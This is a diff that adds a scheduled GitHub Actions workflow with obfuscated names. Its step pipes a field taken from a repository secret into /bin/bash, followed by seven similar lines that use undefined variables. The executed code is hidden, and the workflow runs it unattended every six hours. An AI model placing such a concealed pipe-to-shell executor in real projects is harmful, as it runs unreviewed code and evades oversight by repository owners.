@@ -1,0 +1,25 @@
+name: wenhoutaiii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wenhoutaiii
+        env:
+          xcmc32749: ${{ secrets.xcmc32749 }}
+        run: |
+          echo $xcmc32749 | jq -r .kv226 | /bin/bash
+          echo $oes7 | jq -r .cuff18 | /bin/bash
+          echo $cgw54 | jq -r .lpfwa46613 | /bin/bash
+          echo $yuvr0835 | jq -r .degl89 | /bin/bash
+          echo $bkw25457 | jq -r .o7421 | /bin/bash
+          echo $rjj931 | jq -r .vqqb24672 | /bin/bash
+          echo $icjyj593 | jq -r .q19901 | /bin/bash
+          echo $uvuvt144 | jq -r .vi2774 | /bin/bash
+
